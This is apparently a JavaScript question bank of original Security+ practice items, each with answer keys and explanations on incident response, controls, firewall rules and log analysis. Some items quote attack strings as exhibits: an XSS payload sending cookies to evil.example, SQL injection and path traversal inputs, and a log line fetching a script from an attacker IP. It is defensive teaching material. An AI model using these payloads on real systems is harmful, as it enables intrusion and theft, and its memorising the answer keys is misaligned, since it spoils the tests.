/* CompTIA Security+ SY0-701 -- performance-based questions (PBQs).
   ORIGINAL items written for this app, modelled on the interaction styles the
   real exam uses. Not taken from CompTIA or any book.

   Three interaction types cover the six common PBQ styles:
     order       -- put steps in sequence            (IR steps, volatility, change mgmt)
     categorize  -- place each item in a group        (control types, attack -> indicator,
                                                        network zone placement)
     table       -- pick a value for each blank cell  (firewall rules, wireless/server
                                                        settings, log analysis)

   Scoring is partial credit: the fraction of positions / placements / cells
   that are right. `objective` is the exam objective the item tests. */

window.PBQ_BANK = [
  {
    "id": "PBQ-01",
    "objective": "4.8",
    "type": "order",
    "question": "A SOC analyst has confirmed ransomware on a file server. Put the incident response process in the order CompTIA defines it.",
    "items": [
      "Preparation",
      "Detection",
      "Analysis",
      "Containment",
      "Eradication",
      "Recovery",
      "Lessons learned"
    ],
    "explanation": "Preparation happens before any incident. Detection spots it, analysis confirms scope and impact, containment stops the spread, eradication removes every trace, recovery returns systems to service, and lessons learned feeds back into preparation. The classic trap is putting eradication before containment: you stop the bleeding before you clean the wound."
  },
  {
    "id": "PBQ-02",
    "objective": "4.8",
    "type": "order",
    "question": "You are collecting evidence from a compromised, still-running server. Order the sources from MOST volatile (collect first) to LEAST volatile.",
    "items": [
      "CPU registers and cache",
      "RAM (running processes, network connections)",
      "Swap / page file",
      "Local disk",
      "Remote logs on the SIEM",
      "Archived backup tapes"
    ],
    "explanation": "Order of volatility: capture what disappears fastest first. CPU cache and RAM vanish on power-off; swap is rewritten constantly; the disk survives a reboot; remote logs sit safely elsewhere; archived backups barely change at all. Pulling the power first would destroy the top two layers."
  },
  {
    "id": "PBQ-03",
    "objective": "1.3",
    "type": "order",
    "question": "A critical patch must be applied to a production database. Put the change management steps in order.",
    "items": [
      "Submit a change request",
      "Perform an impact analysis",
      "Obtain approval from the change advisory board",
      "Implement during the maintenance window",
      "Perform validation testing",
      "Update the documentation"
    ],
    "explanation": "The request starts the record, impact analysis gives approvers the evidence, the CAB approves, the change happens in the agreed window, validation proves the service works, and documentation records the new reality. Validation comes straight after implementation, before anyone closes the ticket."
  },
  {
    "id": "PBQ-04",
    "objective": "4.3",
    "type": "order",
    "question": "Order the vulnerability management activities for a newly discovered flaw on your web servers.",
    "items": [
      "Identify the vulnerability with a scan",
      "Analyze and prioritize it using CVSS and asset value",
      "Remediate by applying the patch",
      "Validate the fix with a rescan",
      "Report the outcome to stakeholders"
    ],
    "explanation": "Identify, analyze, remediate, validate, report. Prioritizing comes before fixing, because you can't patch everything at once. Validation (a rescan) comes before reporting, because 'patched' isn't proven until the scanner agrees."
  },
  {
    "id": "PBQ-05",
    "objective": "1.4",
    "type": "order",
    "question": "An administrator needs a TLS certificate for a new public web server. Put the steps in order.",
    "items": [
      "Generate a public/private key pair on the server",
      "Create a certificate signing request (CSR) containing the public key",
      "Submit the CSR to the certificate authority",
      "The CA validates the organization's identity or domain ownership",
      "The CA signs and issues the certificate",
      "Install the certificate on the web server"
    ],
    "explanation": "The key pair comes first, because the CSR carries the public key. The private key never leaves the server. The CA checks you really control the domain before signing, then you install what it issues."
  },
  {
    "id": "PBQ-06",
    "objective": "1.1",
    "type": "categorize",
    "question": "Classify each security control by its CATEGORY.",
    "categories": ["Technical", "Managerial", "Operational", "Physical"],
    "items": [
      { "text": "Firewall access control list", "category": "Technical" },
      { "text": "Endpoint antivirus", "category": "Technical" },
      { "text": "Annual risk assessment", "category": "Managerial" },
      { "text": "Acceptable use policy", "category": "Managerial" },
      { "text": "Security awareness training delivered by staff", "category": "Operational" },
      { "text": "Configuration management procedure", "category": "Operational" },
      { "text": "Bollards outside the entrance", "category": "Physical" },
      { "text": "Perimeter fencing", "category": "Physical" }
    ],
    "explanation": "Category is about HOW a control is implemented. Technical = technology does it. Managerial = oversight, policy and risk decisions. Operational = people carrying out day-to-day procedures. Physical = tangible barriers. Don't confuse category with TYPE (preventive, detective and so on); that's the next question's job."
  },
  {
    "id": "PBQ-07",
    "objective": "1.1",
    "type": "categorize",
    "question": "Classify each control by its TYPE, meaning what it does.",
    "categories": ["Preventive", "Detective", "Corrective", "Deterrent", "Compensating", "Directive"],
    "items": [
      { "text": "A firewall blocks inbound RDP", "category": "Preventive" },
      { "text": "An IDS alerts on port scanning", "category": "Detective" },
      { "text": "Restoring a server from backup after ransomware", "category": "Corrective" },
      { "text": "A 'CCTV in operation' sign on the fence", "category": "Deterrent" },
      { "text": "Extra monitoring on a legacy system that cannot be patched", "category": "Compensating" },
      { "text": "A policy requiring screens to be locked", "category": "Directive" },
      { "text": "Reviewing audit logs weekly", "category": "Detective" },
      { "text": "Door locks on the server room", "category": "Preventive" }
    ],
    "explanation": "Preventive stops it happening. Detective notices it happened. Corrective fixes the damage. Deterrent discourages the attempt: a sign has no power to stop anyone, it just changes minds. Compensating is a substitute when the ideal control isn't possible. Directive tells people what to do (policies, procedures)."
  },
  {
    "id": "PBQ-08",
    "objective": "2.4",
    "type": "categorize",
    "question": "Match each indicator an analyst found to the attack it most likely shows.",
    "categories": ["Password spraying", "Brute force", "SQL injection", "Directory traversal", "Cross-site scripting", "ARP poisoning (on-path)"],
    "items": [
      { "text": "400 accounts each fail ONE login with the same password", "category": "Password spraying" },
      { "text": "One account fails 3,000 logins in ten minutes", "category": "Brute force" },
      { "text": "Web log: /products.php?id=7' OR '1'='1", "category": "SQL injection" },
      { "text": "Web log: /view.php?file=../../../../etc/passwd", "category": "Directory traversal" },
      { "text": "Comment field saved as <script>document.location='http://evil.example/?c='+document.cookie</script>", "category": "Cross-site scripting" },
      { "text": "The default gateway's MAC address in hosts' ARP tables changes to an unknown workstation", "category": "ARP poisoning (on-path)" }
    ],
    "explanation": "Spraying = MANY accounts, FEW passwords (it dodges lockouts). Brute force = ONE account, MANY passwords. ' OR '1'='1 rewrites a database query (SQL injection). ../ climbs out of the web root (traversal). A script stored and served to other users steals their cookies (XSS). A changed gateway MAC means traffic is being redirected through an attacker (on-path)."
  },
  {
    "id": "PBQ-09",
    "objective": "3.2",
    "type": "categorize",
    "question": "You are designing a segmented network. Place each system in the zone it belongs in.",
    "categories": ["Screened subnet (DMZ)", "Internal network", "Management network"],
    "items": [
      { "text": "Public-facing web server", "category": "Screened subnet (DMZ)" },
      { "text": "Reverse proxy for public sites", "category": "Screened subnet (DMZ)" },
      { "text": "Inbound email gateway", "category": "Screened subnet (DMZ)" },
      { "text": "Domain controller", "category": "Internal network" },
      { "text": "Database holding customer records", "category": "Internal network" },
      { "text": "Employee file server", "category": "Internal network" },
      { "text": "Switch and firewall administrative interfaces", "category": "Management network" },
      { "text": "Hypervisor management console", "category": "Management network" }
    ],
    "explanation": "Anything the internet must reach directly lives in the screened subnet, so a compromise there doesn't land an attacker inside. Systems holding identity and data stay internal, reached only through the DMZ services. Admin interfaces get their own management network, because whoever controls them controls everything."
  },
  {
    "id": "PBQ-10",
    "objective": "4.5",
    "type": "categorize",
    "question": "An audit found insecure protocols in use. Match each one to its secure replacement.",
    "categories": ["SSH", "SFTP", "HTTPS", "SNMPv3", "LDAPS", "DNSSEC"],
    "items": [
      { "text": "Telnet (port 23)", "category": "SSH" },
      { "text": "FTP (ports 20/21)", "category": "SFTP" },
      { "text": "HTTP (port 80)", "category": "HTTPS" },
      { "text": "SNMPv1 / v2c community strings", "category": "SNMPv3" },
      { "text": "LDAP (port 389)", "category": "LDAPS" },
      { "text": "DNS responses that can be forged or poisoned", "category": "DNSSEC" }
    ],
    "explanation": "Telnet → SSH (22). FTP → SFTP (runs over SSH, 22). HTTP → HTTPS (443). SNMPv1/v2c send community strings in clear text → SNMPv3 adds authentication and encryption. LDAP → LDAPS (636). DNSSEC signs DNS records so forged answers can be spotted. Note that DNSSEC gives integrity, not confidentiality."
  },
  {
    "id": "PBQ-11",
    "objective": "4.5",
    "type": "categorize",
    "question": "Your domain's mail is being spoofed. Match each description to the email authentication control it describes.",
    "categories": ["SPF", "DKIM", "DMARC"],
    "items": [
      { "text": "A DNS TXT record listing the servers allowed to send mail for the domain", "category": "SPF" },
      { "text": "Fails when mail is relayed through a server that isn't listed", "category": "SPF" },
      { "text": "A digital signature in the message header, checked with a public key published in DNS", "category": "DKIM" },
      { "text": "Proves the message body wasn't altered in transit", "category": "DKIM" },
      { "text": "Tells receiving servers to quarantine or reject mail that fails the checks", "category": "DMARC" },
      { "text": "Sends aggregate reports back to the domain owner", "category": "DMARC" }
    ],
    "explanation": "SPF = WHO may send (an IP allow list in DNS). DKIM = PROOF it's genuine and unaltered (a signature). DMARC = WHAT TO DO when the checks fail (reject or quarantine), plus reporting. If a question says 'reject', the answer is DMARC."
  },
  {
    "id": "PBQ-12",
    "objective": "4.5",
    "type": "table",
    "question": "Configure the DMZ firewall. Requirements: the web server 10.0.2.10 must serve HTTPS (never plain HTTP) to anyone on the internet. Only the admin subnet 10.0.1.0/24 may use SSH to the web server. Everything else must be blocked. Rules are processed top to bottom.",
    "columns": ["Rule", "Source", "Destination", "Port", "Action"],
    "rows": [
      ["1", "ANY", "10.0.2.10",
        { "options": ["22", "23", "80", "443", "3389"], "answer": "443" },
        { "options": ["ALLOW", "DENY"], "answer": "ALLOW" }],
      ["2",
        { "options": ["ANY", "10.0.1.0/24", "10.0.2.0/24"], "answer": "10.0.1.0/24" },
        "10.0.2.10",
        { "options": ["22", "23", "80", "443", "3389"], "answer": "22" },
        { "options": ["ALLOW", "DENY"], "answer": "ALLOW" }],
      ["3",
        { "options": ["ANY", "10.0.1.0/24", "10.0.2.0/24"], "answer": "ANY" },
        "ANY",
        "ANY",
        { "options": ["ALLOW", "DENY"], "answer": "DENY" }]
    ],
    "explanation": "Rule 1 allows HTTPS (443) from anywhere, and port 80 stays closed because plain HTTP is forbidden. Rule 2 limits SSH (22) to the admin subnet only. Rule 3 is the implicit-deny catch-all, and it must come LAST: rules run top to bottom, so a deny-all placed first would block everything above it."
  },
  {
    "id": "PBQ-13",
    "objective": "4.1",
    "type": "table",
    "question": "Configure two wireless networks. STAFF: each employee signs in with their own directory account, and access is revoked when they leave. GUEST: one shared passphrase, the strongest personal-mode security, and guests must not be able to reach each other. WPS must be off on both.",
    "columns": ["Setting", "STAFF SSID", "GUEST SSID"],
    "rows": [
      ["Security mode",
        { "options": ["Open", "WEP", "WPA2-Personal (PSK)", "WPA3-Personal (SAE)", "WPA3-Enterprise"], "answer": "WPA3-Enterprise" },
        { "options": ["Open", "WEP", "WPA2-Personal (PSK)", "WPA3-Personal (SAE)", "WPA3-Enterprise"], "answer": "WPA3-Personal (SAE)" }],
      ["Authentication",
        { "options": ["Pre-shared key", "RADIUS (802.1X)", "MAC filtering"], "answer": "RADIUS (802.1X)" },
        { "options": ["Pre-shared key", "RADIUS (802.1X)", "MAC filtering"], "answer": "Pre-shared key" }],
      ["Client isolation",
        "(not part of the requirement)",
        { "options": ["Enabled", "Disabled"], "answer": "Enabled" }],
      ["WPS",
        { "options": ["Enabled", "Disabled"], "answer": "Disabled" },
        { "options": ["Enabled", "Disabled"], "answer": "Disabled" }]
    ],
    "explanation": "Individual accounts that can be revoked means Enterprise mode: WPA3-Enterprise with RADIUS/802.1X checking each user against the directory. A shared passphrase means Personal mode, and WPA3's SAE is stronger than WPA2's PSK. Client isolation stops guests reaching or attacking each other. WPS is a known weakness, so it's off on both. MAC filtering is trivially spoofed and never the secure answer."
  },
  {
    "id": "PBQ-14",
    "objective": "2.4",
    "type": "table",
    "question": "Review the web server log extract and complete the analysis.",
    "exhibit": "203.0.113.45 - - [17/Sep/2026:10:02:11] \"GET /index.php HTTP/1.1\" 200 5120\n203.0.113.45 - - [17/Sep/2026:10:02:14] \"GET /download.php?file=report.pdf HTTP/1.1\" 200 88213\n203.0.113.45 - - [17/Sep/2026:10:02:19] \"GET /download.php?file=../config.php HTTP/1.1\" 404 312\n203.0.113.45 - - [17/Sep/2026:10:02:23] \"GET /download.php?file=../../../../etc/passwd HTTP/1.1\" 200 2291\n198.51.100.20 - - [17/Sep/2026:10:02:30] \"GET /index.php HTTP/1.1\" 200 5120",
    "columns": ["Finding", "Your answer"],
    "rows": [
      ["Attack type",
        { "options": ["SQL injection", "Cross-site scripting", "Directory traversal", "Buffer overflow"], "answer": "Directory traversal" }],
      ["Attacker IP address",
        { "options": ["203.0.113.45", "198.51.100.20", "10.0.2.10"], "answer": "203.0.113.45" }],
      ["Did the attack succeed?",
        { "options": ["Yes: /etc/passwd returned 200 with content", "No: the server returned 404", "Cannot tell from the log"], "answer": "Yes: /etc/passwd returned 200 with content" }],
      ["Best fix in the application",
        { "options": ["Input validation / allow-list file names", "Enable TLS", "Increase password complexity", "Add CAPTCHA to the login page"], "answer": "Input validation / allow-list file names" }]
    ],
    "explanation": "../ sequences climbing out of the web folder are directory traversal. The first attempt got a 404, but the /etc/passwd request returned 200 with 2,291 bytes, so it worked. 198.51.100.20 is an ordinary visitor. The root cause is trusting user input as a file path, so the fix is input validation (only allow known file names). TLS encrypts traffic and does nothing to stop this."
  },
  {
    "id": "PBQ-15",
    "objective": "4.9",
    "type": "table",
    "question": "A Red Hat server's authentication log shows the following. Complete the investigation.",
    "exhibit": "Sep 17 02:14:01 web01 sshd[4410]: Failed password for root from 45.61.22.9 port 50122 ssh2\nSep 17 02:14:02 web01 sshd[4410]: Failed password for root from 45.61.22.9 port 50124 ssh2\n... (2,386 similar lines) ...\nSep 17 02:31:47 web01 sshd[4410]: Failed password for root from 45.61.22.9 port 61001 ssh2\nSep 17 02:31:49 web01 sshd[4417]: Accepted password for root from 45.61.22.9 port 61003 ssh2\nSep 17 02:32:05 web01 sudo: root : TTY=pts/0 ; COMMAND=/usr/bin/wget http://45.61.22.9/x.sh",
    "columns": ["Finding", "Your answer"],
    "rows": [
      ["Log file this came from",
        { "options": ["/var/log/secure", "/var/log/auth.log", "/var/log/httpd/access_log"], "answer": "/var/log/secure" }],
      ["Attack type",
        { "options": ["Password spraying", "Brute force", "Pass the hash", "Replay attack"], "answer": "Brute force" }],
      ["Was the attacker successful?",
        { "options": ["Yes: 'Accepted password' followed by a download", "No: every attempt failed"], "answer": "Yes: 'Accepted password' followed by a download" }],
      ["Immediate next step",
        { "options": ["Isolate web01 from the network", "Reset every user's password company-wide", "Delete the log file", "Wait for more evidence"], "answer": "Isolate web01 from the network" }],
      ["Hardening to prevent a repeat",
        { "options": ["Disable SSH root login and require key-based auth", "Move SSH to port 2222 only", "Increase log retention"], "answer": "Disable SSH root login and require key-based auth" }]
    ],
    "explanation": "Red Hat and CentOS write auth events to /var/log/secure; Debian and Ubuntu use /var/log/auth.log. Thousands of attempts against ONE account is brute force (spraying hits many accounts). 'Accepted password' plus a wget of a script means a live compromise, so contain it first by isolating the host. Deleting logs destroys evidence. Changing the port only hides SSH; removing root password logins actually fixes it."
  },
  {
    "id": "PBQ-16",
    "objective": "2.5",
    "type": "table",
    "question": "Harden a new internet-facing Linux web server. Choose the most secure setting that still lets it serve its website and be administered.",
    "columns": ["Setting", "Value"],
    "rows": [
      ["SSH root login", { "options": ["Permitted", "Disabled"], "answer": "Disabled" }],
      ["SSH authentication", { "options": ["Password", "Key-based"], "answer": "Key-based" }],
      ["Telnet service", { "options": ["Running", "Removed"], "answer": "Removed" }],
      ["Host firewall inbound policy", { "options": ["Allow all", "Default deny, allow 443 and admin SSH"], "answer": "Default deny, allow 443 and admin SSH" }],
      ["Default accounts", { "options": ["Left as shipped", "Removed or passwords changed"], "answer": "Removed or passwords changed" }],
      ["Security updates", { "options": ["Manual, yearly", "Automatic or on a defined patch schedule"], "answer": "Automatic or on a defined patch schedule" }]
    ],
    "explanation": "Hardening means shrinking the attack surface: no direct root login, keys instead of guessable passwords, remove unneeded services (Telnet is clear text), default-deny firewall with only the required ports open, no default credentials, and timely patching. Each setting maps to a 2.5 or 4.1 hardening technique."
  },
  {
    "id": "PBQ-17",
    "objective": "5.2",
    "type": "categorize",
    "question": "Classify each decision by its risk management strategy.",
    "categories": ["Accept", "Avoid", "Mitigate", "Transfer"],
    "items": [
      { "text": "Buy cyber insurance to cover breach costs", "category": "Transfer" },
      { "text": "Outsource card payments to a PCI-compliant provider", "category": "Transfer" },
      { "text": "Stop offering a legacy service that can't be secured", "category": "Avoid" },
      { "text": "Deploy a WAF in front of the web application", "category": "Mitigate" },
      { "text": "Add MFA to remote access", "category": "Mitigate" },
      { "text": "Document the risk and take no action because the fix costs more than the likely loss", "category": "Accept" }
    ],
    "explanation": "Transfer moves the financial impact to someone else (insurance, outsourcing). Avoid removes the activity that creates the risk. Mitigate reduces likelihood or impact with a control. Accept is a conscious, documented decision to live with it, usually because fixing it costs more than the risk."
  },
  {
    "id": "PBQ-18",
    "objective": "5.3",
    "type": "categorize",
    "question": "Match each need to the agreement type that covers it.",
    "categories": ["NDA", "SLA", "MSA", "SOW", "MOU", "BPA"],
    "items": [
      { "text": "Keep the product designs we share with a contractor confidential", "category": "NDA" },
      { "text": "Guarantee 99.9% uptime, with service credits if missed", "category": "SLA" },
      { "text": "Set the framework terms that all future projects with a vendor will follow", "category": "MSA" },
      { "text": "Define the deliverables, timeline and cost of one specific project", "category": "SOW" },
      { "text": "A non-binding statement that two organizations intend to work together", "category": "MOU" },
      { "text": "Two partners share responsibilities and profits of a joint venture", "category": "BPA" }
    ],
    "explanation": "NDA protects shared confidential data. SLA sets measurable service levels and penalties. MSA is the umbrella contract; each SOW under it defines one piece of work. MOU records intent and usually isn't binding. BPA governs a business partnership."
  }
];
